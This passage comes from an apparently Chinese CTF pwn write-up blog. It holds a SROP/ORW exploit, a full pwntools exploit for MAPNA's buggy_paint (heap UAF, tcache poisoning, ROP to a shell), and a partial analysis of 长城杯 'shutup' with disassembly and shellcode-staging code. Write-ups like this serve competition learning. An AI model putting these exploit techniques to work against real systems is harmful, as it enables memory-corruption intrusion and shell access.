class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line">flag=<span class="number">0x404178</span>      </span><br><span class="line">lr=<span class="number">0x40136c</span></span><br><span class="line">syscall_ret=<span class="number">0x40118A</span><span class="comment">#syscall; nop; pop rbp; ret;</span></span><br><span class="line">p=process(elf_path)     </span><br><span class="line"><span class="comment">#p=remote(&#x27;47.108.206.43&#x27;,43800)</span></span><br><span class="line">pop_rax_ret=<span class="number">0x3f587</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x27c65</span></span><br><span class="line">pop_rdx_ret=<span class="number">0xfd68d</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x29419</span></span><br><span class="line">syscall=<span class="number">0x853b2</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	r()</span><br><span class="line"></span><br><span class="line">	sigframe = SigreturnFrame()</span><br><span class="line">	sigframe.rax=<span class="number">1</span></span><br><span class="line">	sigframe.rdi=<span class="number">0x1</span></span><br><span class="line">	sigframe.rsi=<span class="number">0x403fd8</span></span><br><span class="line">	sigframe.rdx=<span class="number">0x8</span></span><br><span class="line">	sigframe.rip=syscall_ret</span><br><span class="line">	sigframe.rsp=<span class="number">0x404460</span></span><br><span class="line"></span><br><span class="line">	payload=p64(<span class="number">0x404460</span>)+p64(syscall_ret)+p64(<span class="number">0x404460</span>)+p64(syscall_ret)+<span class="built_in">bytes</span>(sigframe)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;chall\0&#x27;</span></span><br><span class="line">	payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload+=p64(<span class="number">0x404460</span>)+p64(<span class="number">0x4013D4</span>)</span><br><span class="line">	s(payload)</span><br><span class="line"></span><br><span class="line">	payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(<span class="number">0x404060</span>)+p64(lr)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#dbg()</span></span><br><span class="line">	s(payload)</span><br><span class="line">	r()</span><br><span class="line">	sleep(<span class="number">0.2</span>)</span><br><span class="line">	s(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">	libc.address=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">	leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">	</span><br><span class="line">	payload=p64(<span class="number">0x404800</span>)+p64(pop_rdi_ret+libc.address)+p64(flag)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">0o777</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">0x5a</span>)+p64(syscall+libc.address)</span><br><span class="line">	payload+=p64(pop_rdi_ret+libc.address)+p64(flag)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">4</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">2</span>)+p64(syscall+libc.address)</span><br><span class="line">	payload+=p64(pop_rdi_ret+libc.address)+p64(<span class="number">3</span>)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">0x404a00</span>)+p64(pop_rdx_ret+libc.address)+p64(<span class="number">64</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">0</span>)+p64(syscall+libc.address)</span><br><span class="line">	payload+=p64(pop_rdi_ret+libc.address)+p64(<span class="number">1</span>)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">0x404a00</span>)+p64(pop_rdx_ret+libc.address)+p64(<span class="number">0x40</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">1</span>)+p64(syscall+libc.address)</span><br><span class="line">	s(payload)</span><br><span class="line">	sleep(<span class="number">0.2</span>)</span><br><span class="line">	r()</span><br><span class="line">	s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(<span class="number">0x404060</span>)+p64(lr))</span><br><span class="line">	</span><br><span class="line">	irt()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h1 id="2024MAPNA-buggy-paint"><a href="#2024MAPNA-buggy-paint" class="headerlink" title="2024MAPNA-buggy_paint"></a>2024MAPNA-buggy_paint</h1><p><strong>标签:tcache attack|UAF</strong></p>
<p>菜单堆体,libc是2.35版本,无seccomp</p>
<p>核心漏洞是</p>
<p>select选择一个note时,将该note删除掉,依然能进行edit,show等操作,即可uaf</p>
<p>通过这些可以泄露heap和libc</p>
<p>之后再进行tcache attack,使得tcache中的一条链无限指向其自身</p>
<p>依此申请的管理节点chunk与缓存可写chunk重叠</p>
<p>从而达到<u>任意写任意读</u></p>
<p>这里选择泄露environ,打rop</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span>(script):</span><br><span class="line">		gdb.attach(p, script)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		<span class="keyword">return</span> process(elf_path)</span><br><span class="line">	<span class="keyword">return</span> remote(<span class="string">&#x27;3.75.185.198&#x27;</span>,<span class="number">2000</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">c</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;&gt; &#x27;</span>,tbs(c))	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">x,y,w,h,content</span>):</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;x: &#x27;</span>,tbs(x))</span><br><span class="line">	sla(<span class="string">b&#x27;y: &#x27;</span>,tbs(y))</span><br><span class="line">	sla(<span class="string">b&#x27;width: &#x27;</span>,tbs(w))</span><br><span class="line">	sla(<span class="string">b&#x27;height: &#x27;</span>,tbs(h))</span><br><span class="line">	sla(<span class="string">b&#x27;color(1=red, 2=green): &#x27;</span>,tbs(<span class="number">1</span>))</span><br><span class="line">	sa(<span class="string">b&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">x,y</span>):</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;x: &#x27;</span>,tbs(x))</span><br><span class="line">	sla(<span class="string">b&#x27;y: &#x27;</span>,tbs(y))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">select</span>(<span class="params">x,y</span>):</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;x: &#x27;</span>,tbs(x))</span><br><span class="line">	sla(<span class="string">b&#x27;y: &#x27;</span>,tbs(y))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;New content: &#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	menu(<span class="number">5</span>)</span><br><span class="line">	ru(<span class="string">b&#x27;Box content:\n&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">heap_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	create(<span class="number">0</span>,i,<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">select(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">	delete(<span class="number">0</span>,i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">libc_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219CE0</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">	create(<span class="number">0</span>,i,<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(p64((heap_base+<span class="number">0xa90</span>)^(heap_base&gt;&gt;<span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#申请不同大小,以免管理节点chunk内容被程序清空,不过其实相同也没什么影响</span></span><br><span class="line"></span><br><span class="line">note=flat(&#123;<span class="number">0x0</span>:<span class="number">3</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="number">3</span>,</span><br><span class="line"><span class="number">0x10</span>:heap_base,</span><br><span class="line"><span class="number">0x18</span>:<span class="number">8</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0x28</span>:environ&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(note)</span><br><span class="line">select(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">show()</span><br><span class="line">stack=u64(r(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">select(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">note=flat(&#123;<span class="number">0x0</span>:<span class="number">3</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="number">3</span>,</span><br><span class="line"><span class="number">0x10</span>:heap_base,</span><br><span class="line"><span class="number">0x18</span>:<span class="number">8</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="number">6</span>,</span><br><span class="line"><span class="number">0x28</span>:stack-<span class="number">0x120</span>&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(note)</span><br><span class="line">select(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">edit(p64(pop_rdi_ret)+p64(stack-<span class="number">0x120</span>+<span class="number">0x20</span>)+p64(libc_base+<span class="number">0x29139</span>)+p64(libc_base+system)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">menu(<span class="number">6</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="2024长城杯-shutup"><a href="#2024长城杯-shutup" class="headerlink" title="2024长城杯-shutup"></a>2024长城杯-shutup</h1><p><strong>标签:无回显|rop|shellcode|gadget发现</strong></p>
<p>tmd,有思路都写了三个小时,太菜了 orz</p>
<p>主函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setv();</span><br><span class="line">  read(<span class="number">0</span>, &amp;unk_601380, <span class="number">0x40</span>uLL);</span><br><span class="line">  read_in();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>往bss读取了64个字节</p>
<p>read_in()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">read_in</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( read(<span class="number">0</span>, nptr, <span class="number">0x10</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = atoi(nptr);</span><br><span class="line">    read(<span class="number">0</span>, nptr, v0);</span><br><span class="line">    qword_601060[<span class="number">0</span>] += atoi(nptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> qword_601060[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读取当读取的字节为零(套接字断开)的时候就能结束循环</p>
<p><strong>看到这种没有输出的题目,第一时间就要想到利用已有的libc指针构造syscall</strong></p>
<p>然后mprotect修改权限执行shellcode</p>
<p>且注意到<code>qword_601060[0] += atoi(nptr);</code>明显可以用来调整read指针为syscall</p>
<p>此外恰好题目给了一个这样的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4006B7</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> qword_601060[a1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果rdi为负数,那么就可以取出read的指针,后面还可以用来置rax系统调用号</p>
<hr>
<p>先理清一下流程</p>
<p>开始题目允许我们写入64个字节,暂时不知道有什么用,先略过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;unk_601380, <span class="number">0x40</span>uLL);</span><br></pre></td></tr></table></figure>
<p>之后进入到read_in函数,其允许我们自定义读取的字节数,也就是说我们能够布置近乎任意长的ropchain</p>
<p>但是只能一次,因为该循环的结束条件是关闭写管道,之后再调用read就无效了</p>
<p>第一思路是先栈溢出返回到<code>sub_4006B7</code>利用负数取出got表上的read指针</p>
<p>取出后,注意到<code>+=atoi</code>的对象是<code>qword_6011060</code>,恰好再跳转<code>0x400715</code>就能将rax存入该处</p>
<p>但此时因为结尾的<code>leave;ret</code>,所以这里需要准备一次栈迁移</p>
<p>这里就体现出开头读取64字节的作用了,其可以用于栈迁移</p>
<p>并且再往下,我们需要跳转到<code>0x4006FC</code>进行指针调整,rbp是可控的,所以我们可以寻找一个地方放置对应的字符串,其也是可以放在<code>0x601380</code></p>
<p>之后又有一次栈迁移同理处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006D2                               ; __unwind &#123;</span><br><span class="line">.text:00000000004006D2 55                            push    rbp</span><br><span class="line">.text:00000000004006D3 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004006D6 48 83 EC 10                   sub     rsp, 10h</span><br><span class="line">.text:00000000004006DA EB 40                         jmp     short loc_40071C</span><br><span class="line">.text:00000000004006DA</span><br><span class="line">.text:00000000004006DC                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004006DC</span><br><span class="line">.text:00000000004006DC                               loc_4006DC:                             ; CODE XREF: read_in+63↓j</span><br><span class="line">.text:00000000004006DC 48 8D 45 F0                   lea     rax, [rbp+nptr]</span><br><span class="line">.text:00000000004006E0 48 89 C7                      mov     rdi, rax                        ; nptr</span><br><span class="line">.text:00000000004006E3 E8 68 FE FF FF                call    atoi</span><br><span class="line">.text:00000000004006E3</span><br><span class="line">.text:00000000004006E8 48 63 D0                      movsxd  rdx, eax                        ; nbytes</span><br><span class="line">.text:00000000004006EB 48 8D 45 F0                   lea     rax, [rbp+nptr]</span><br><span class="line">.text:00000000004006EF 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class="line">.text:00000000004006F2 BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class="line">.text:00000000004006F7 E8 34 FE FF FF                call    read</span><br><span class="line">.text:00000000004006F7</span><br><span class="line">.text:00000000004006FC 48 8D 45 F0                   lea     rax, [rbp+nptr]</span><br><span class="line">.text:0000000000400700 48 89 C7                      mov     rdi, rax                        ; nptr</span><br><span class="line">.text:0000000000400703 E8 48 FE FF FF                call    atoi</span><br><span class="line">.text:0000000000400703</span><br><span class="line">.text:0000000000400708 48 63 D0                      movsxd  rdx, eax</span><br><span class="line">.text:000000000040070B 48 8B 05 4E 09 20 00          mov     rax, cs:qword_601060</span><br><span class="line">.text:0000000000400712 48 01 D0                      add     rax, rdx</span><br><span class="line">.text:0000000000400715 48 89 05 44 09 20 00          mov     cs:qword_601060, rax</span><br><span class="line">.text:0000000000400715</span><br><span class="line">.text:000000000040071C</span><br><span class="line">.text:000000000040071C                               loc_40071C:                             ; CODE XREF: read_in+8↑j</span><br><span class="line">.text:000000000040071C 48 8D 45 F0                   lea     rax, [rbp+nptr]</span><br><span class="line">.text:0000000000400720 BA 10 00 00 00                mov     edx, 10h                        ; nbytes</span><br><span class="line">.text:0000000000400725 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class="line">.text:0000000000400728 BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class="line">.text:000000000040072D E8 FE FD FF FF                call    read</span><br><span class="line">.text:000000000040072D</span><br><span class="line">.text:0000000000400732 48 85 C0                      test    rax, rax</span><br><span class="line">.text:0000000000400735 7F A5                         jg      short loc_4006DC</span><br><span class="line">.text:0000000000400735</span><br><span class="line">.text:0000000000400737 48 8B 05 22 09 20 00          mov     rax, cs:qword_601060</span><br><span class="line">.text:000000000040073E C9                            leave</span><br><span class="line">.text:000000000040073F C3                            retn</span><br><span class="line">.text:000000000040073F                               ; &#125; // starts at 4006D2</span><br><span class="line">.text:000000000040073F</span><br><span class="line">.text:000000000040073F                               read_in endp</span><br></pre></td></tr></table></figure>
<p>现在我们已经在<code>0x601060</code>放置了一个<code>syscall;ret</code>gadget的地址了</p>
<p>之后利用csu就能进行调用了,但现在面临的一个问题是开头读取的64个字节太短了,既要布置栈迁移rop流</p>
<p>又要布置字符串,剩余的空间完全不可能允许我们布置csu以及shellcode</p>
<p>好在天无绝人之路</p>
<p>注意看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006B7                               var_4= dword ptr -4</span><br><span class="line">.text:00000000004006B7</span><br><span class="line">.text:00000000004006B7                               ; __unwind &#123;</span><br><span class="line">.text:00000000004006B7 55                            push    rbp</span><br><span class="line">.text:00000000004006B8 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004006BB 89 7D FC                      mov     [rbp+var_4], edi</span><br><span class="line">.text:00000000004006BE 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004006C1 48 98                         cdqe</span><br><span class="line">.text:00000000004006C3 48 C1 E0 03                   shl     rax, 3</span><br><span class="line">.text:00000000004006C7 48 05 60 10 60 00             add     rax, 601060h</span><br><span class="line">.text:00000000004006CD 48 8B 00                      mov     rax, [rax]</span><br><span class="line">.text:00000000004006D0 5D                            pop     rbp</span><br><span class="line">.text:00000000004006D1 C3                            retn</span><br><span class="line">.text:00000000004006D1                               ; &#125; // starts at 4006B7</span><br></pre></td></tr></table></figure>
<p>从<code>0x4006BB</code>处,不是就有一个将<code>edi</code>放到<code>[rbp+var_4]</code>处</p>
<p>而elf中是存在<code>pop rdi;ret</code>和<code>pop_rbp;ret</code>这两个gadget的,那岂不就是说可以通过布置rop流来在bss段上任意写!!!</p>
<p>不过考虑到之后会利用<code>edi</code>作为下表偏移从<code>0x601060</code>处取值,如果edi太大那么就可能会读到空洞中,从而导致段错误</p>
<p>还好<u>mov指令是不要求操作数对齐的</u>,因此我们可以每次写入一个字节就rbp+1,以此写入多次来完成布置</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">more</span>(<span class="params">addr,shellcode</span>):</span><br><span class="line">	payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">		<span class="keyword">if</span> shellcode[i]==<span class="number">0</span>:</span><br><span class="line">			addr+=<span class="number">1</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> i !=<span 